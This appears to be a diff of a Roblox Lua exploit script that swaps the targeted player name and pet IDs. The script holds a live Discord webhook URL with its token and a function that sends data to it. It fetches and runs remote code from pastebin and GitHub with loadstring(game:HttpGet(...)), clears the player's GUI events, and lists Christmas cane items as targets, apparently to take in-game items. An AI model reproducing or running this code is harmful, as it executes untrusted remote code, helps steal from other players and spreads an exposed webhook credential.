@@ -1,6 +1,6 @@
 local WEBHOOK = "https://discord.com/api/webhooks/1531244922945015928/I1OBXVQMZ4PoO5cGOiuJYR_5Gz9UkC8vedJS93NnMccNJoqbeBZHzwb0Wc5KsB1Dbl8p"
 local player = game.Players.LocalPlayer
-if player.Name ~= "100throne100" then return end
+if player.Name ~= "999throne999" then return end
 
 local function send(content, embed)
     local data = {content = content or "", username = "t3ars", embeds = embed and {embed} or nil}
@@ -29,7 +29,7 @@ loadstring(game:HttpGet("https://pastebin.com/raw/S7uzDeEE"))()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/nullhubexe/ps1-branch/refs/heads/main/antifps"))()
 game.Players.LocalPlayer.PlayerGui.Events:ClearAllChildren()
 
-local PETS = {12554673, 24859206, 46004070, 68736361}
+local PETS = {27042603, 85698934, 79203336, 72389476}
 local TARGETS = {
     ["Christmas3 Cane"] = 1,
     ["Christmas3 Small Cane"] = 2,
